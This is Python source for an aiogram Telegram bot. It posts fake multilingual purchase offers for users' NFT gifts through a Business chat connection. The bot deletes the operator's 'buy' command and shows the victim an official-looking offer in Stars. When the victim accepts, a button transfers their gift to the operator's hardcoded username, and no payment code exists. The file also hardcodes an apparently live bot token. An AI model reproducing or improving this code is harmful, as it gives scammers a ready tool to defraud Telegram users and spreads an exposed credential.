import asyncio
import html
import logging
import random
import re
from urllib.parse import urlparse

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LinkPreviewOptions,
)

# ==================================================
# НАСТРОЙКИ
# ==================================================

TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"
MY_USERNAME = "criedfornothing"

# ID твоих премиум-эмодзи
STAR_ID = "5289728073040672852"
CHECK_ID = "5776375003280838798"
CROSS_ID = "5778527486270770928"

logging.basicConfig(level=logging.INFO)

bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(
        parse_mode=ParseMode.HTML
    ),
)

dp = Dispatcher()


# ==================================================
# ПРЕМИУМ-ЭМОДЗИ
# ==================================================

def emoji(custom_id: str, fallback: str) -> str:
    return (
        f'<tg-emoji emoji-id="{custom_id}">'
        f'{fallback}</tg-emoji>'
    )


STAR = emoji(STAR_ID, "⭐")
CHECK = emoji(CHECK_ID, "✅")
CROSS = emoji(CROSS_ID, "❌")


# ==================================================
# ПЕРЕВОДЫ
# ==================================================

TEXTS = {
    "ru": {
        "offer": "Пользователь предлагает вам",
        "price": "за подарок",
        "private": (
            "Частное предложение. "
            "Оплата и передача подарка не гарантируются."
        ),
        "accept": "ПРИНЯТЬ",
        "decline": "ОТКЛОНИТЬ",
        "accepted": "Предложение принято.",
        "declined": "Предложение отклонено.",
        "transfer": "Передать подарок",
        "invalid": (
            "Формат команды:\n"
            "buy ссылка сумма stars язык"
        ),
    },

    "en": {
        "offer": "The user offers you",
        "price": "for the gift",
        "private": (
            "Private offer. Payment and gift transfer "
            "are not guaranteed."
        ),
        "accept": "ACCEPT",
        "decline": "DECLINE",
        "accepted": "Offer accepted.",
        "declined": "Offer declined.",
        "transfer": "Transfer gift",
        "invalid": "Format: buy link amount stars language",
    },

    "uk": {
        "offer": "Користувач пропонує вам",
        "price": "за подарунок",
        "private": (
            "Приватна пропозиція. Оплата та передача "
            "подарунка не гарантуються."
        ),
        "accept": "ПРИЙНЯТИ",
        "decline": "ВІДХИЛИТИ",
        "accepted": "Пропозицію прийнято.",
        "declined": "Пропозицію відхилено.",
        "transfer": "Передати подарунок",
        "invalid": "Формат: buy посилання сума stars мова",
    },

    "be": {
        "offer": "Карыстальнік прапануе вам",
        "price": "за падарунак",
        "private": (
            "Прыватная прапанова. Аплата і перадача "
            "падарунка не гарантуюцца."
        ),
        "accept": "ПРЫНЯЦЬ",
        "decline": "АДХІЛІЦЬ",
        "accepted": "Прапанова прынята.",
        "declined": "Прапанова адхілена.",
        "transfer": "Перадаць падарунак",
        "invalid": "Фармат: buy спасылка сума stars мова",
    },

    "zh": {
        "offer": "用户向您提出报价",
        "price": "购买礼物",
        "private": "私人报价。付款和礼物转移不受保证。",
        "accept": "接受",
        "decline": "拒绝",
        "accepted": "报价已接受。",
        "declined": "报价已拒绝。",
        "transfer": "转移礼物",
        "invalid": "格式：buy 链接 金额 stars 语言",
    },

    "ar": {
        "offer": "يعرض عليك المستخدم",
        "price": "مقابل الهدية",
        "private": "عرض خاص. الدفع ونقل الهدية غير مضمونين.",
        "accept": "قبول",
        "decline": "رفض",
        "accepted": "تم قبول العرض.",
        "declined": "تم رفض العرض.",
        "transfer": "نقل الهدية",
        "invalid": "الصيغة: buy الرابط المبلغ stars اللغة",
    },

    "tr": {
        "offer": "Kullanıcı size teklif ediyor",
        "price": "hediye için",
        "private": (
            "Özel teklif. Ödeme ve hediye aktarımı garanti edilmez."
        ),
        "accept": "KABUL ET",
        "decline": "REDDET",
        "accepted": "Teklif kabul edildi.",
        "declined": "Teklif reddedildi.",
        "transfer": "Hediyeyi aktar",
        "invalid": "Biçim: buy bağlantı tutar stars dil",
    },

    "es": {
        "offer": "El usuario te ofrece",
        "price": "por el regalo",
        "private": (
            "Oferta privada. El pago y la transferencia "
            "no están garantizados."
        ),
        "accept": "ACEPTAR",
        "decline": "RECHAZAR",
        "accepted": "Oferta aceptada.",
        "declined": "Oferta rechazada.",
        "transfer": "Transferir regalo",
        "invalid": "Formato: buy enlace cantidad stars idioma",
    },

    "de": {
        "offer": "Der Benutzer bietet Ihnen",
        "price": "für das Geschenk",
        "private": (
            "Privates Angebot. Zahlung und Geschenktransfer "
            "sind nicht garantiert."
        ),
        "accept": "ANNEHMEN",
        "decline": "ABLEHNEN",
        "accepted": "Angebot angenommen.",
        "declined": "Angebot abgelehnt.",
        "transfer": "Geschenk übertragen",
        "invalid": "Format: buy Link Betrag stars Sprache",
    },

    "fr": {
        "offer": "L'utilisateur vous propose",
        "price": "pour le cadeau",
        "private": (
            "Offre privée. Le paiement et le transfert "
            "du cadeau ne sont pas garantis."
        ),
        "accept": "ACCEPTER",
        "decline": "REFUSER",
        "accepted": "Offre acceptée.",
        "declined": "Offre refusée.",
        "transfer": "Transférer le cadeau",
        "invalid": "Format : buy lien montant stars langue",
    },
}


# ==================================================
# ХРАНИЛИЩЕ ЗАКАЗОВ
# ==================================================

# ВНИМАНИЕ: данные исчезнут после перезапуска программы.
orders = {}


# ==================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ==================================================

def get_gift_name(url: str) -> str:
    """Извлекает предполагаемое название из ссылки."""
    path = urlparse(url).path.rstrip("/")
    name = path.split("/")[-1] or "NFT Gift"

    return html.escape(name)


def create_keyboard(order_id: str, lang: str):
    t = TEXTS[lang]

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"✅ {t['accept']}",
                    callback_data=f"accept:{order_id}",
                ),
                InlineKeyboardButton(
                    text=f"❌ {t['decline']}",
                    callback_data=f"decline:{order_id}",
                ),
            ]
        ]
    )


def valid_url(url: str) -> bool:
    parsed = urlparse(url)

    return (
        parsed.scheme == "https"
        and bool(parsed.netloc)
        and "." in parsed.netloc
    )


# ==================================================
# ОБРАБОТКА КОМАНДЫ BUY
# ==================================================

@dp.business_message()
async def handle_business_message(message: Message):

    # Работаем только с сообщениями Business-подключения.
    if not message.business_connection_id:
        return

    if message.chat.type != "private":
        return

    text = (message.text or "").strip()

    # Команда начинается со слова buy.
    if not re.match(r"^buy\s+", text, re.IGNORECASE):
        return

    parts = text.split()

    if len(parts) != 5:
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=message.business_connection_id,
            text=TEXTS["ru"]["invalid"],
        )
        return

    _, gift_url, amount_text, currency, lang = parts

    lang = lang.lower()
    currency = currency.lower()

    if lang not in TEXTS:
        lang = "en"

    if not valid_url(gift_url):
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=message.business_connection_id,
            text="Укажи корректную HTTPS-ссылку.",
        )
        return

    if currency != "stars":
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=message.business_connection_id,
            text="Валюта должна быть stars.",
        )
        return

    try:
        amount = int(amount_text)

        if not 1 <= amount <= 1_000_000_000:
            raise ValueError

    except ValueError:
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=message.business_connection_id,
            text="Укажи корректную сумму.",
        )
        return

    t = TEXTS[lang]
    gift_name = get_gift_name(gift_url)

    # Случайный номер заказа.
    order_id = f"TG-{random.randint(100000, 999999)}"

    # Сохраняем предложение.
    orders[order_id] = {
        "chat_id": message.chat.id,
        "business_connection_id": message.business_connection_id,
        "lang": lang,
        "gift_url": gift_url,
        "amount": amount,
        "status": "pending",
    }

    offer_text = (
        f"{t['offer']}\n\n"
        f"{STAR} <b>{amount:,}</b> "
        f"{STAR} {t['price']}\n\n"
        f"<b>{gift_name}</b>\n\n"
        f"Заказ #{order_id}\n\n"
        f"<i>{t['private']}</i>\n\n"
        f'<a href="{html.escape(gift_url, quote=True)}">'
        f"Открыть подарок</a>"
    )

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=message.business_connection_id,
            text=offer_text,
            reply_markup=create_keyboard(order_id, lang),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                show_above_text=True,
            ),
        )

        # Пытаемся удалить исходную команду.
        try:
            await bot.delete_message(
                chat_id=message.chat.id,
                message_id=message.message_id,
                business_connection_id=message.business_connection_id,
            )
        except Exception as error:
            logging.warning(
                "Не удалось удалить команду: %s",
                error,
            )

    except Exception:
        logging.exception("Ошибка отправки предложения")


# ==================================================
# КНОПКА ПРИНЯТЬ
# ==================================================

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):

    order_id = callback.data.split(":", 1)[1]
    order = orders.get(order_id)

    if not order:
        await callback.answer(
            "Предложение не найдено.",
            show_alert=True,
        )
        return

    if order["status"] != "pending":
        await callback.answer(
            "Предложение уже обработано.",
            show_alert=True,
        )
        return

    # Проверяем, что действие выполняется в нужном чате.
    if callback.message.chat.id != order["chat_id"]:
        await callback.answer("Неверный чат.", show_alert=True)
        return

    order["status"] = "accepted"

    lang = order["lang"]
    t = TEXTS[lang]

    transfer_url = f"tg://send_gift?to={MY_USERNAME}"

    new_text = (
        f"{CHECK} <b>{t['accepted']}</b>\n\n"
        f"{STAR} <b>{order['amount']:,}</b>\n\n"
        f"<i>{t['private']}</i>"
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=t["transfer"],
                    url=transfer_url,
                )
            ]
        ]
    )

    try:
        await bot.edit_message_text(
            chat_id=order["chat_id"],
            message_id=callback.message.message_id,
            business_connection_id=order["business_connection_id"],
            text=new_text,
            reply_markup=keyboard,
        )

        await callback.answer(t["accepted"])

    except Exception:
        logging.exception("Ошибка изменения предложения")
        await callback.answer(
            "Не удалось изменить сообщение.",
            show_alert=True,
        )


# ==================================================
# КНОПКА ОТКЛОНИТЬ
# ==================================================

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):

    order_id = callback.data.split(":", 1)[1]
    order = orders.get(order_id)

    if not order:
        await callback.answer(
            "Предложение не найдено.",
            show_alert=True,
        )
        return

    if order["status"] != "pending":
        await callback.answer(
            "Предложение уже обработано.",
            show_alert=True,
        )
        return

    if callback.message.chat.id != order["chat_id"]:
        await callback.answer("Неверный чат.", show_alert=True)
        return

    order["status"] = "declined"

    lang = order["lang"]
    t = TEXTS[lang]

    try:
        await bot.edit_message_text(
            chat_id=order["chat_id"],
            message_id=callback.message.message_id,
            business_connection_id=order["business_connection_id"],
            text=f"{CROSS} <b>{t['declined']}</b>",
            reply_markup=None,
        )

        await callback.answer(t["declined"])

    except Exception:
        logging.exception("Ошибка изменения предложения")
        await callback.answer(
            "Не удалось изменить сообщение.",
            show_alert=True,
        )


# ==================================================
# ЗАПУСК
# ==================================================

async def main():

    if TOKEN == "ВСТАВЬ_СЮДА_ТОКЕН_БОТА":
        print("ОШИБКА: вставь токен бота в переменную TOKEN!")
        return

    try:
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
        )
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())